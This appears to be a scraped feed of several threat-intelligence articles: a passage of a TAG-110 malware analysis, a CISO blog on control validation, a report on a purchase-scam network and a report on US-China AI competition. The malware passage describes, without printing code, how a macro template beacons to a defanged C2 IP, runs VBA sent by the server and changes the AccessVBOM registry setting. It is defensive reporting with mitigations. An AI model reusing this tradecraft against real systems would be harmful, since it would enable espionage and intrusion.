        <ul>
          <li>Checks to see the last time Microsoft Word was started; this is <a href="https://learn.microsoft.com/en-us/office/vba/api/word.system.profilestring">stored and maintained</a> by the global template in the registry location HKEY_CURRENT_USER\Software\Microsoft\Office&lt;Version&gt;\Word\Options\LastTime -- If the value of LastTime is less than 60 seconds, AutoExec will end execution</li>
          <li>Collects the following system information and stores it in JSON format: -- Computer name -- Username -- Region -- Monitor resolution -- Language -- System version</li>
          <li>Waits three seconds before executing the getInfo()Sub procedure, per Figure 5.</li>

          </div>
        </div>
        <h4>getInfo() Sub Procedure</h4>
        <p>The getInfo() Sub procedure initiates communication between the victim and the C2 server. The procedure accomplishes this by completing the following operations:</p>
        <ul>
          <li>Creates an HTTP request object and makes an HTTP POST to the URL <code>http://38.180.206[.]61/engine.php</code></li>
          <li>Per <strong>Figure 7</strong>, the HTTP request has the following characteristics:
            <ul>
              <li>Content-type header set to application/x-www-form-urlencoded</li>
              <li>User-Agent header set to a Base64-encoded ID unique in both samples</li>
              <li>POST data in the format of opamczqwe=&amp;ywalokmsz=</li>
            </ul>
          </li>
          <li>If the C2 server’s response starts with "%%%%,"” the Sub procedure will take the rest of the string after it and use that as the argument in the start Sub procedure</li>
          <li>If the server HTTP response does not start with "%%%%," it will wait ten seconds and try again until it gets a response starting with “%%%%”</li>
          <li>The sample d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7 makes use of a count loop where the collected data is only sent in every tenth HTTP POST, whereas the sample 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 will only send the collected data on the first HTTP POST</li>

        <h4>start() Sub Procedure</h4>
        <p>The start() Sub procedure is likely used to execute additional VBA supplied in C2 responses. The Sub procedure accomplishes this by completing the following operations:</p>
        <ul>
          <li>It splits the remaining C2 response, using the string “###” as a delimiter, and stores the values into an array</li>
          <li>This array of strings is used as variables, likely to create a block of code similar to those used in previous TAG-110 macro-enabled Word documents, such as 6ac6a0dd78d2e3f58e95fa1a20b3ab22b4b49a1ab816dcfb32fd6864e1969ac3, as seen in Figure 8</li>
          <li>The array values are used to create a COM object (likely WScipt.shell based on code overlap from previous VBA code used by TAG-110) and written to a value in the registry
            <ul>
              <li>This is likely modifying HKEY_CURRENT_USER\Software\Microsoft\Office\\Word\Security\AccessVBOM in the registry, as this tactic was used in the previous campaigns</li>
              <li>This registry modification allows VBA macros to modify and access other VBA projects</li>
            </ul>
          </li>
          <li>Another COM object (likely Word.Application based on code overlap from previous VBA code used by TAG-110) will launch Microsoft Word in the background, create a new document inside that Microsoft Word instance, add a VBA module, and execute it after three seconds</li>

        <h3>Malicious Infrastructure</h3>
        <p>The files d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7 and 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 share the same C2 server, 38.180.206[.]61. This IP address was previously identified as a HATVIBE C2 server and attributed to TAG-110 by <a href="https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/">Sekoia</a>. At the time of analysis, Insikt Group could not obtain additional second-stage VBA modules. However, based on TAG-110’s historical activity and tool set, it is likely that successful initial access via the macro-enabled templates would result in the deployment of additional malware, such as HATVIBE, CHERRYSPY, LOGPIE, or potentially a new, custom-developed payload designed for espionage operations.</p>
        <h2>Mitigations</h2>
        <ul>
          <li>Monitor for and alert on creating or modifying global template files in the Microsoft Word startup folder, which may indicate persistent macro abuse.</li>
          <li>Detect and investigate registry modifications to AccessVBOM under HKEY_CURRENT_USER\Software\Microsoft\Office&lt;Version&gt;\Word\Security, which may signal attempts to enable or manipulate VBA macro behavior.</li>
          <li>Disable macros by default in Microsoft Office applications and implement Group Policy Objects (GPOs) to prevent users from enabling them unless explicitly approved.</li>
          <li>Use Recorded Future® Threat Intelligence to monitor for newly emerging TAG-110 infrastructure, malware signatures, and phishing document indicators.</li>
          <li>Integrate Recorded Future Threat Intelligence Modules into SIEM and SOAR platforms to receive real-time alerts on activity linked to TAG-110 and other Russia-aligned threat actors.</li>
        </ul>
        <h2>Outlook</h2>
        <p>Based on current and past Insikt Group reporting, TAG-110 has consistently used macro-enabled spearphishing documents to deliver malware and establish persistence in target environments. Insikt Group expects TAG-110 to continue leveraging regional events and bureaucratic themes to craft their lures. We also expect the targeting of entities related to government, defense, or public infrastructure in Central Asia to persist, especially around sensitive events such as elections or military activity.</p>

            <description><![CDATA[Explore how CISOs can transition from audit checkmarks to genuine cyber resilience through continuous control validation. Insights from RSA 2025 on redefining cybersecurity strategies.]]></description>
            <content:encoded><![CDATA[
        <p>RSA is always a good opportunity to reconnect with industry friends—2025 was no exception. Beneath the marketing avalanche of “AI-enabled everything,” one theme stuck out in conversations with CISOs and defensive leaders: the mounting time and energy spent on cyber audits, reporting, and remediation.</p>
        <p>These Enterprise Risk Management (ERM) and Governance, Risk, and Compliance (GRC) efforts are especially demanding in regulated industries. But with mandates like <a href="https://digital-strategy.ec.europa.eu/en/policies/nis2-directive">NIS2</a> and <a href="https://finance.ec.europa.eu/regulation-and-supervision/financial-services-legislation/implementing-and-delegated-acts/digital-operational-resilience-regulation_en">DORA</a> taking effect in Europe—and domestic frameworks like <a href="https://www.isaca.org/resources/isaca-journal/issues/2022/volume-6/are-it-general-controls-outdated">SOX</a>, <a href="https://www.aicpa-cima.com/resources/download/trust-services-criteria">SOC2</a>, and <a href="https://dodcio.defense.gov/CMMC/Documentation/">CMMC</a> still in play—security leaders are spending more time with audit committees than ever before.</p>
        <h2>Compliance Theater: Starring the Risk Register</h2>
        <p>In enterprises, defensive resource allocations are often adjudicated by committees and measured by audit progress and the almighty risk register. This means most of the attention (and budget) aligns with avoiding one specific risk: legal or compliance failure (LCF). It’s no surprise that CISOs are often left with a single 15-minute slot each year to brief the board on the <a href="https://intelligence2risk.substack.com/p/five-risk-categories">other four cyber risk impacts</a>. That’s a missed opportunity.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="fd1196e7-bada-42fe-a6c7-89d17c95a98f_1536x1024.webp" src="https://www.recordedfuture.com/media_170cc4b3c2b25687f3afd8faf56e8168c79e95317.png?width=750&amp;format=png&amp;optimize=medium" width="1456" height="971" />

          </div>

            <div><em>Board presentation produced by ChatGPT 4o.</em></div>
          </div>
        </div>
        <p>Boards need to better understand cyber risk beyond compliance. The <a href="https://intelligence2risk.substack.com/p/the-resilience-dilemma">“state of rizz” (resilience)</a> depends on more than audit checklists. Point-in-time audits work well for demonstrating regulatory due diligence. If something goes wrong, but the virtual paperwork shows that policies were followed and corrections made, enforcement actions can often be minimized or avoided.</p>
        <p>That’s not true for the other risk impacts—operational disruption, financial fraud, brand impairment, and competitive disadvantage. Even after clean audits, the residual risk across these domains remains. Boards need to grasp this difference. And CISOs must continue translating technical risk into business language that supports resilience conversations.</p>
        <h2>Measuring Rizz: Easier Said Than Sustained</h2>
        <p>Communicating rizz is momentary. Measuring it is constant. Organizations spend heavily to prevent all five impacts, but security investments tied to non-compliance impacts often receive less scrutiny (<a href="https://www.isaca.org/resources/isaca-journal/issues/2015/volume-1/return-on-security-investment15-things-to-consider">ROSI</a>). That’s where control validation comes in.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="db8bfa53-0eaa-4b4d-9851-ffc68b449c44_1600x1110.webp" src="https://www.recordedfuture.com/media_120f90ae974a47d65975ce40953366bec102fc400.png?width=750&amp;format=png&amp;optimize=medium" width="1456" height="1010" />

          </div>
        </div>
        <p>Looking ahead (meaning, likely six months from now), AI agents will monitor and challenge other AI agents in continuous loops of control testing and remediation, especially as adversary TTPs evolve daily.</p>
        <h2>The Automation Angle: Purple Teams and Silver Bullets</h2>
        <p>Until then, automation in purple teaming, breach and attack simulation (BAS), and exposure validation is the best way to scale defenses without burning out staff.</p>
        <p>A growing number of vendors (like <a href="https://www.picussecurity.com/">Picus</a>) offer automated testing platforms with user-friendly workflows. These platforms aren’t silver bullets, but they help CISOs tell a better executive story.</p>

            <div>
              <img loading="lazy" alt="7953860e-e123-423f-a4dd-df174b2c727b_1024x1024.webp" src="https://www.recordedfuture.com/media_1875750ae43308f248b0b705bfa138ab767727629.png?width=750&amp;format=png&amp;optimize=medium" width="1024" height="1024" />

            <div><em>A silver bullet produced by ChatGPT 4o.</em></div>
          </div>
        </div>
        <p>Consider <a href="https://www.neo.space/blog/business-email-compromise-attacks">Business Email Compromise (BEC)</a>. GRC will enforce controls like phishing simulations and financial separation of duties to satisfy <a href="https://tipalti.com/resources/learn/internal-controls-for-accounts-payable/">LCF (Limit Control Frameworks)</a> requirements. But if the CISO is also emulating attacks and testing the actual tech stack—email gateways, MFA, IAM policies—the story becomes richer. It shows intentional, tested resilience across financial fraud risk, not just paper compliance. It’s far more compelling than: “We have an EDR as prescribed in our compliance framework.”</p>
        <h2>Real Rizz Moves: How Live Threat Emulation Beats Paper Promises</h2>
        <p>To make this real, draw from live TTPs observed in the wild. For example, within the past 90 days (as of May 14, 2025), Recorded Future’s AI Insights flagged dozens of events that could be used as fuel for BAS automation.</p>
        <ul>

        </ul>
        <h2>Risk Registers Win Audits. Rizz Wins Crises.</h2>
        <p>If the board only sees traffic light audit checkmarks, they’re missing the real color of cyber risk. That’s why rizz narratives must move beyond compliance and into control validation and business risk translation—before the next threat does it for you.</p>

            <content:encoded><![CDATA[
        <h2>Executive Summary</h2>
        <p>On April 19, 2025, Recorded Future® Payment Fraud Intelligence identified lidlorg[.]com as a likely purchase <a href="/research/scam-websites-take-advantage-of-seasonal-openings">scam website</a> that employs <a href="/research/eriakos-scam-campaign-detected">brand impersonation</a> against a German international discount retailer. As of May 8, 2025, our analysis has linked <em>lidlorg[.]com</em> to a network of 71 likely purchase <a href="/research/black-friday-trends-insights-mitigating-online-shopping-scams">scam websites</a>, including others that combine brand impersonation and online ad campaigns for propagation. All identified scam websites use one or more of twelve shared merchant accounts to process visitor transactions. All transactions with these merchant accounts are highly likely to be fraudulent and facilitate <a href="/blog/from-breach-to-fraud-payment-card-lifecycle">card compromise</a>.</p>
        <p>Purchase scams present <a href="/industry/financial">financial fraud risks</a> to card issuers and <a href="/blog/navigating-cybersecurity-landscape-with-the-risk-business">compliance risks</a> to merchant acquirers, especially in cases where linked scam merchant accounts are also abused to support transaction laundering activity. To reduce these risks, card issuers should take action against identified merchant accounts and card accounts that have transacted with those merchants, while merchant acquirers should take action against the merchant accounts. We describe these mitigation strategies in detail in the Mitigations section of this report.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>On April 19, 2025, we identified lidlorg[.]com as a likely purchase scam website that uses brand impersonation against a German retailer.</li>
          <li>The scam website lidlorg[.]com is likely part of a network of 71 purchase scam domains using the same merchant accounts to defraud victims and steal victim data.</li>
          <li>Transactions with the merchant accounts linked to lidlorg[.]com are highly likely to be fraudulent and facilitate card compromise. These merchant accounts include AKRU KERAMIK GMBH, ANT <em>ONLINE E-COMMERCE STO, BALSAMIC, CLOTHWEARABLY, LMS AESTHETICS, MYCOZYBABIES, ONCLOTHESSHOES, PETHOUSEN LLC, REFINEDHAT, YSP</em> CLOTHINGGSHOP, YSP <em>NIHILSTOOL, and YSP</em> QHWLKJSHOP.</li>
          <li>It is unclear whether the network of scam domains and merchant accounts is controlled by a single threat actor or various threat actors acting in concert — for example, through partnership on the dark web and the provision of dark web-based services in a greater scam ecosystem.</li>
          <li>To attribute this scam network to a single threat actor or various threat actors, card issuers and merchant acquirers with access to merchant data can likely leverage commonalities in associated merchant registration information, such as company data.</li>
        </ul>
        <h2>Threat Analysis of Purchase Scam Websites</h2>
        <p><strong>On April 19, 2025, Recorded Future identified lidlorg[.]com as a likely purchase scam website.</strong> The operators of <em>lidlorg[.]com</em> employed brand impersonation targeting a German international discount retailer chain, as indicated by the use of typosquatting in the domain name and the abuse of a brand logo by “<a href="https://www.facebook.com/profile.php?id=61573499135719">EU STORE</a>” and “<a href="https://www.facebook.com/profile.php?id=61574165562569">L Clearance</a>”, two advertiser accounts <a href="https://www.facebook.com/ads/library/?active_status=all&amp;ad_type=all&amp;country=ALL&amp;is_targeted_country=false&amp;media_type=all&amp;q=%22lidlorg.com%22&amp;search_type=keyword_exact_phrase">linked</a> to <em>lidlorg[.]com</em> (<strong>Figure 1</strong>). The scam website likely defrauds victims through the use of three linked merchant accounts, which enable the operator to conduct a fraudulent scam transaction while stealing victim personal and financial data for downstream fraud.</p>
        <p><strong>Recorded Future</strong> <strong><a href="/products/payment-fraud-intelligence">Payment Fraud Intelligence</a></strong> <strong>distinguishes purchase scam websites from phishing websites through their use of linked merchant accounts.</strong> While the purchase scams we identify are similar to other online scams (especially in their reliance on fraudulent offers for goods and services that buyers will never receive), they are distinct from phishing websites because they can process victim payments rather than simply collecting victim data through bogus form submissions.</p>

        <p><strong>Our analysis indicated that</strong> <strong><em>lidlorg[.]com</em></strong> <strong>is part of a network of 71 likely scam e-commerce domains, as indicated by overlapping use of scam merchant accounts.</strong> All likely scam domains use various combinations of the same merchant accounts for their payment functionality and have been operational since no later than February 2025. Many of the domains also use typosquatting to impersonate multiple brands. At the time of our analysis, many of the domains were associated with active or historical online ad campaigns. Many of these were also removed by the ad platform for “<a href="https://transparency.meta.com/policies/ad-standards/fraud-scams/unacceptable-business-practices">Unacceptable Business Practices</a>,” which includes scam activity. On average, the domains were 65 days old and likely malicious, as indicated by their average DomainTools risk score of 88/100.</p>
        <p><strong>Figure 2</strong> illustrates the links between the identified scam domains and merchant accounts. The Appendix of this report lists the scam domains, merchant accounts, and all timestamps when we confirmed that they were linked.</p>

        <p><strong><em>Table 1:</em></strong> <em>All transactions with merchant accounts linked to lidlorg[.]com are likely to be fraudulent (Source: Recorded Future)</em></p>
        <p>Note that inaccurate associated merchant URL data suggests that threat actors likely use merchant accounts within this group for transaction laundering. For example, merchant data indicates that PETHOUSEN LLC is associated with pethousen[.]com rather than the three scam domains we linked it to (biliability[.]com, dknyonlineuk[.]com, outletmalleu[.]shop). Inaccurately associated merchant URLs often indicate that a merchant is engaging in transaction laundering.</p>
        <p><strong>Transaction laundering allows threat actors to conceal high-risk or illegal activity by processing payments for an entity, goods, or services unknown to the merchant’s acquiring bank or payment provider.</strong> While the transactions are disguised as low-risk or legitimate purchases, they are often transactions for illegal activities. In this sense, all purchase scam transactions that defraud victims are inherently a form of transaction laundering.</p>
        <p><strong>It is unclear whether the scam network identified in this report is controlled by a single threat actor or various threat actors acting in concert.</strong> Merchant account abuse for purchase scams frequently overlaps between networks of linked domains, as shown in Figure 2. While merchant accounts dispersed throughout scam networks network can have similarities that suggest a common origin or operator, the networks of scam domains linked to the merchant accounts are often distinct (for example, in their abuse of different ad platforms for propagation to victims)</p>
        <p>Because of this, we consider the two following scenarios equally likely regarding attribution of the scam network to an operator:</p>
        <ul>
          <li>Multiple networks of scam domains operated by different threat actors may be using the same merchant accounts, whose services are rented out as part of a third-party, dark web-based “cash-out” offering.</li>
          <li>A single threat actor may be controlling the domain and merchant infrastructure for the entire network, intentionally rotating the domain/merchant combinations in an attempt to obscure attribution.</li>
        </ul>
        <p><strong>An ecosystem of illicit dark web services likely supports</strong> <strong><a href="/research/how-cybercrime-gets-monetized">fraud-focused threat actors</a>.</strong> These threat actors leverage third-party services for a variety of scam use cases, including the following:</p>
        <ul>
          <li><strong>Fraud-based malvertising services:</strong> Threat actors organize illicit advertising services by compromising advertiser accounts for online ad platforms or by purchasing advertising campaigns using stolen financial data.</li>
          <li><strong>“Cash-out” services:</strong> Threat actors purvey merchant accounts under their control to other threat actors to monetize stolen card data.</li>
          <li><strong>Traffic services:</strong> Threat actors drive traffic to artificially boost malicious advertisements, including for scam websites, in search results. Alternatively, they partner with cash-out service providers to monetize existing victim traffic to scam domains.</li>
        </ul>
        <p><strong>Card issuers and merchant acquirers with access to merchant data can likely leverage merchant analysis for threat actor attribution of this scam network.</strong> Commonalities in merchant registration would likely indicate that the accounts are operated by a single threat actor, whereas discrepancies would indicate that the accounts are operated by various threat actors. Identical company data is an example of a commonality that we would expect to see in linked merchant accounts operated by a single threat actor.</p>
        <p>Note that since scam domains are easier to acquire and less resilient to detection and mitigation than merchant accounts (and therefore more expendable as infrastructure), we consider domain analysis less likely to enable threat actor attribution of this scam network.</p>
        <h2>Mitigations for Fraud Prevention</h2>
        <p>Purchase scams present financial fraud risks to card issuers and compliance risks to merchant acquirers, especially in cases where linked scam merchant accounts are also abused to support transaction laundering activity. To reduce these risks, apply the mitigation strategies described below.</p>
        <h3>Card Issuers</h3>
        <ul>
          <li>To prioritize fraud prevention over potential customer friction, immediately decline transactions with the identified scam merchant accounts and track customer card accounts that have transacted with the merchant for additional fraud signals before taking action.
            <ul>
              <li>Escalate the fraud risk score of customer accounts that attempt transactions with the merchants or flag the account for additional review.</li>
              <li>Consider the presence of additional fraud signals on flagged accounts as a high-confidence basis to reissue the customer card or apply other remediations.</li>
            </ul>
          </li>
          <li>To minimize customer friction, assess transaction data within your cardholder portfolio with the identified scam merchant accounts before taking action against either the merchant accounts or customer card accounts.
            <ul>
              <li>Bucket all customer transactions with the identified merchants.</li>
              <li>Determine a fraud incidence threshold in accordance with your organization’s risk tolerance. This threshold should be higher than the baseline fraud incidence rate observed across your portfolio.</li>
              <li>If customer transactions within the bucket exceed the fraud incidence threshold, automatically block all customer transactions with the identified merchant accounts and consider card reissue.</li>
            </ul>
          </li>
        </ul>
        <h3>Merchant Acquirers</h3>
        <ul>
          <li>
            <ul>
              <li>Analyze linked merchant domains to identify other likely fraudulent merchant accounts operated within the scam network. Card network acquirer data lookup APIs may enable merchant acquirers to search for merchant accounts based on domain.</li>
              <li>Scan merchant acquirer BIN and MCC combinations within your merchant portfolio to identify other likely fraudulent merchant accounts registered with similar merchant data or within a short period of time. Card network APIs may enable merchant acquirers to search for merchant account registrations based on acquirer BIN and MCC.</li>
              <li>Flag suspected fraudulent merchant accounts for enhanced due diligence, investigation, suspension, or termination in accordance with your risk tolerance.</li>
            </ul>
          </li>
        </ul>
        <h2>Outlook for Purchase Scam Networks</h2>
        <ul>
          <li>Our analysis has confirmed that the likely purchase scam network identified in this report has been operational since February 2025. Because we continue to confirm new scam domains within the group are operational, the scam operation appears to be ongoing. By extension, the scam operator will likely continue deploying new domains and online ad campaigns to support their scam activity, especially as old domains and ad campaigns are taken offline.</li>
          <li>These new scam domains will likely use the merchant accounts identified in this report. Termination or suspension of scam merchant accounts by their acquirers is unlikely to halt all scam activity by the operator. However, this kind of remediation would almost certainly place additional time and resource demands on the scam network operator to acquire new merchant account infrastructure.</li>
        </ul>

            <description><![CDATA[Explore Insikt Group's in-depth 2025 report on the US-China AI race—comparing funding, talent, regulation, compute capacity, and model benchmarks. Discover why China trails the US and what could change before 2030.]]></description>
            <content:encoded><![CDATA[
        <h2>Executive Summary</h2>
        <p>China has stated its ambition to become the world leader in artificial intelligence (AI) by 2030, a goal that encompasses not only the performance of individual AI models that often attract significant media attention but also AI innovation broadly and widespread adoption of AI for economic and geopolitical benefit. Based on an analysis of key industry pillars informing the US-China competition for AI supremacy — including government and venture capital (VC) funding, industry regulation, talent, technology diffusion, model performance, and compute capacity — Insikt Group assesses that China is unlikely to sustainably surpass the United States (US) on its desired timeline. Currently, China either trails behind or does not clearly lead the US in any of these pillars. The US-China AI competition is likely to become tighter, with China's AI industry likely being a close second to the US globally and its AI models possibly outperforming the US at times or in some sectors. Chinese generative AI models likely lag behind US competitors by approximately three to six months as of this writing, based on Insikt Group analysis of publicly available Elo benchmarks, but potential new algorithmic breakthroughs along with agentic and collaborative AI systems could significantly sway the competitiveness of US or Chinese models before 2030.</p>
        <p>China’s government has sought to accelerate the development of a world-leading, globally influential AI industry since 2017, when authorities adopted a dedicated plan for achieving this goal. DeepSeek’s unveiling of R1 in January 2025 was a key milestone in this endeavor. R1’s capabilities reflect — and support continuing — noteworthy advances and lines of effort within China’s AI ecosystem. China’s AI research community is very likely benefiting from the government’s supportive policy environment, government-led investment initiatives, access to an increasingly high-quality talent pool, and increasing links between academia and industry. Chinese AI companies like DeepSeek have realized performance gains by innovating and embracing open source. These companies have also become proficient at adopting techniques implemented by US peers and domestic rivals and prioritizing cost efficiency to remain competitive in domestic markets. Chinese open-source models are being adopted domestically and abroad, while inventors and organizations in China are filing more patents for generative AI applications in many key industries such as software, finance, and energy.</p>
        <p>Despite this progress, China’s AI industry faces important challenges. Total private sector investment in AI lags far behind the US, and central government funding likely trails US federal investment by a small margin. China’s access to domestic AI-relevant talent is improving and the attractiveness of its domestic industry is increasing, but it is still insufficient, and the US likely retains its historical advantages. China’s regulations, although pioneering, likely create a drag on innovation for teams with any interest in making their products public. Moreover, China’s semiconductor industry — while achieving notable advances in spite of international export controls on specialized technology — is still unlikely to meet the rapidly growing demand for AI accelerator chips.</p>
        <p>Maintaining leadership in the race to artificial general intelligence (AGI) is almost certainly perceived in China and the US as critical to their national security. To this end, China is almost certain to continue applying its kit of licit and illicit tools for advancing national development, to include economic espionage and foreign talent recruitment. The US and allied governments should closely monitor major developments by Chinese generative AI companies and public and private investment in research and development (R&amp;D), in addition to monitoring indicators of AI diffusion, such as applications and patents. Western AI companies should consider proactively protecting themselves from model distillation and intellectual property (IP) theft. Western hardware manufacturers subject to export controls should continue improving end-customer due diligence processes to remain compliant and avoid selling to proxies of entities sanctioned by the US. Western government, academic, and corporate entities should adopt policies that facilitate the recruitment and retention of global AI talent.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>China’s rapidly maturing AI ecosystem is very likely increasingly fostering collaboration between government, industry, and academia, and is supported by steady advances in semiconductor manufacturing.</li>
          <li>Government funding for AI-related technologies is likely on an upward trajectory in both the US and China as of early 2025, and China’s overall government-led funding likely exceeds investment by US federal and state governments; however, total private-sector investment in AI companies in the US vastly outmatches private-sector investment in China.</li>
          <li>China’s regulatory scheme likely hampers Chinese AI capabilities and extends development and deployment timelines — but only among developers aiming for public-facing products, meaning frontier advancements are unlikely to be impeded.</li>
          <li>The international AI talent pool likely continues to favor the US due to a continuing — though declining — immigration advantage and the quality of elite educational institutions, but the practical implications of this lead for AI competition are likely eroding.</li>
          <li>AI diffusion rather than innovation will very likely determine the "winner" in the competition to economically and geopolitically benefit from the technology, but whether the US or China has greater levels of diffusion is unclear, with one metric (patents) nevertheless showing China has a lead in many industries.</li>
          <li>According to Insikt Group's analysis of model benchmarks, Elo scores, and industry expert assessments, Chinese generative AI models likely now have a three to six-month performance gap behind US rivals, though this time lag is shortening.</li>
          <li>Closing the performance gap while being cost-competitive is very likely to pay off for China by driving the adoption of Chinese generative AI models domestically and abroad.</li>
          <li>Access to high-quality training data and IP is an increasingly contested domain where the US likely retains a competitive advantage; companies in both countries are likely leveraging user-generated content (UGC) to train generative AI models.</li>
          <li>Adopting open source is more prevalent among Chinese AI companies and likely enables China to diffuse its models more broadly than US proprietary models.</li>
          <li>US export controls have also almost certainly prompted the Chinese government to accelerate funding for its AI hardware and semiconductor industries and high-performance computing infrastructure for training and hosting AI models.</li>
          <li>China’s semiconductor industry likely still faces a bottleneck in producing sub-7 nanometer (nm) chips, and it is almost certainly attempting to develop its own extreme ultraviolet (EUV) lithography tools using alternative techniques to advance domestic AI accelerator production.</li>
          <li>Although the current US presidential administration has signalled that maintaining the US’s leading position in AI development is a priority, early actions to decrease public funding for science and target international students over alleged visa infractions likely risk undermining this goal.</li>

        <p>The race to AGI, which is <a href="https://research.aimultiple.com/artificial-general-intelligence-singularity-timing/">estimated</a> by AI experts and industry leaders to be concluded within the next five to ten years, holds considerable stakes for <a href="https://yoshuabengio.org/2024/10/30/implications-of-artificial-general-intelligence-on-national-and-international-security/">national security</a> and <a href="https://globalprioritiesinstitute.org/wp-content/uploads/Philip-Trammell-and-Anton-Korinek_economic-growth-under-transformative-ai.pdf">economic growth</a>. A <a href="https://www.businessinsider.com/sam-altman-cost-using-ai-drop-10-times-every-year-2025-2">declining cost</a> and general availability of human-level AI models — meaning that AI can perform most tasks previously done by humans, <a href="https://nickbostrom.com/papers/survey.pdf">better</a> than humans — will very likely <a href="https://www.brookings.edu/articles/generative-ai-the-american-worker-and-the-future-of-work/">disrupt</a> the future of work while simultaneously <a href="https://darioamodei.com/machines-of-loving-grace">leading</a> to explosive economic growth, with AI <a href="https://www.pwc.com/gx/en/issues/artificial-intelligence/publications/artificial-intelligence-study.html">estimated</a> to contribute $15.7 trillion to the global economy by 2030. Researchers continue <a href="https://www.forbes.com/sites/craigsmith/2023/05/04/geoff-hinton-ais-most-famous-researcher-warns-of-existential-threat/">debating</a> the existential risks and adversarial use of AI, ranging from <a href="https://www.dhs.gov/sites/default/files/2024-04/24_0429_cwmd-dhs-fact-sheet-ai-cbrn.pdf">facilitating</a> chemical, biological, radiological, and nuclear (CBRN) threats to <a href="/research/adversarial-intelligence-red-teaming-malicious-use-cases-ai">targeting</a> democratic processes and supporting <a href="https://openai.com/global-affairs/an-update-on-disrupting-deceptive-uses-of-ai/">offensive</a> <a href="https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai">cyber operations</a>. The notion of "<a href="https://www.belfercenter.org/publication/china-beating-us-ai-supremacy">AI supremacy</a>" captures the geopolitical stakes of the AGI race, with the US and China considered by many to be <a href="https://www.csis.org/analysis/securing-agi-laurel-export-controls-compute-gap-and-chinas-counterstrategy">forerunners</a>.</p>
        <p>On January 20, 2025, Chinese AI research company DeepSeek <a href="https://api-docs.deepseek.com/news/news250120">released</a> R1, an open-source reasoning large language model (LLM) competing with OpenAI’s then state-of-the-art o1 model. The following week, US AI hardware company Nvidia subsequently <a href="https://www.reuters.com/technology/chinas-deepseek-sets-off-ai-market-rout-2025-01-27/">lost</a> $593 billion in market value, marking the single largest market capitalization loss in US history. Media headlines <a href="https://www.npr.org/2025/01/28/g-s1-45061/deepseek-did-a-little-known-chinese-startup-cause-a-sputnik-moment-for-ai">compared</a> DeepSeek’s release of R1 to the Space Race’s "Sputnik moment," <a href="https://www.rusi.org/explore-our-research/publications/commentary/what-would-sputnik-moment-us-china-ai-competition-look">referring</a> to a rapid and unexpected shift in perceived adversary capabilities following the Soviet Union’s surprise launch of the Sputnik satellite into orbit on October 4, 1957.</p>
        <p>The US-Soviet "missile gap" theory is a likely more accurate Cold War analogy of current threat perceptions. Like missile production, the AGI race is not measured solely by <a href="https://www.tandfonline.com/doi/abs/10.1080/08956308.2024.2324407">innovation capacity</a> (launching Sputnik) but also <a href="https://www.fpri.org/article/2024/09/explaining-chinas-diffusion-deficit/">diffusion capacity</a>, or the ability of national ecosystems to align capital, talent, and policies to rapidly convert innovations to economically productive processes (winning the Cold War). The missile gap analogy is also accurate insofar as US leaders <a href="https://www.armscontrol.org/act/2011-05/missile-gap-myth-and-its-progeny">long possessed</a> inaccurate data on Soviet missile capabilities; it was only by 1961 that innovations in satellite imagery <a href="https://www.thespacereview.com/article/523/1">allowed</a> decision-makers to obtain reliable data on this so-called "missile gap." Following the launch of the CORONA satellite project to monitor Soviet ICBM capabilities and Chinese nuclear testing, US President Lyndon Johnson <a href="https://web.archive.org/web/20220505011605/https://www.nytimes.com/1995/09/12/science/spy-satellites-early-role-as-floodlight-coming-clear.html">admitted</a> in 1967: "We've spent $35 billion or $40 billion on the space program. [...] We were doing things we didn't need to do. We were building things we didn't need to build. We were harboring fears we didn't need to harbor." Similarly, advances (whether real or speculative) in Chinese AI development are very likely fueling funding for AI research in the US, where AI capital expenditure is <a href="https://www.businessinsider.com/big-tech-ai-capex-spend-meta-google-amazon-microsoft-earnings-2025-2">projected to reach over $320 billion</a> in 2025, and influencing <a href="https://cdn.openai.com/global-affairs/ostp-rfi/ec680b75-d539-4653-b297-8bcf6e5f7686/openai-response-ostp-nsf-rfi-notice-request-for-information-on-the-development-of-an-artificial-intelligence-ai-action-plan.pdf">opinions</a> on issues like AI regulation.</p>
        <p>Maintaining an accurate threat perception of Chinese AI will almost certainly be key for major business and national security decision-makers in the US and its partners in the coming years. Despite the public perception of sudden and opaque progress via the lens of a "Sputnik moment," the development of China’s AI ecosystem almost certainly bears the fruit of long-term investments, iterative innovation, and the necessity for efficiency gains in the face of hardened chip export controls.</p>
        <h2>China’s AI Industry and Landscape</h2>
        <p>In July 2017, China’s State Council <a href="https://web.archive.org/web/20250303185319/http://www.gov.cn/zhengce/content/2017-07/20/content_5211996.htm">issued</a> the "New Generation Artificial Intelligence Development Plan" (AIDP; 新一代人工智能发展规划), which outlined an ambitious path to <a href="https://digichina.stanford.edu/work/full-translation-chinas-new-generation-artificial-intelligence-development-plan-2017/">achieving</a> "world-leading" AI theories, technologies, and applications and becoming the "world’s primary AI innovation center" by 2030. To achieve these goals, the AIDP calls (in part) for the activities listed below. The AIDP also outlined key challenges China faced at the time — and to some extent continues to face — including a lack of breakthroughs in basic AI theory, algorithms, high-end chips, and other resources and outputs. Since that time, Chinese universities and businesses have become increasingly involved in AI conferences at the frontiers of AI research and have released hundreds of generative AI models. At the same time, China’s semiconductor industry is steadily advancing its capabilities in spite of international restrictions.</p>
        <p>According to the AIDP, China would seek — and in many ways has begun, as documented in this report — to:</p>
        <ul>
          <li>Support a development framework that enables industry, academia, and other sectors to pursue joint and cross-disciplinary innovation</li>
          <li>Seek breakthroughs in R&amp;D, applications, and overall industry, including along the AI-relevant industrial chain</li>
          <li>Improve training and recruitment of talent, focusing on AI specifically as well as AI’s application in other fields</li>
          <li>Promote AI applications and AI-related innovations across industries, enterprises, and services</li>
          <li>Coordinate support for AI across China’s main science and technology (S&amp;T) pillars, including key programs, megaprojects, bases, and talent plans</li>
          <li>Adopt a system of laws, regulations, and norms to aid the development of AI</li>
          <li>Disseminate news of China’s AI progress to foster a society enthusiastic about, and supportive of, AI development</li>
        </ul>
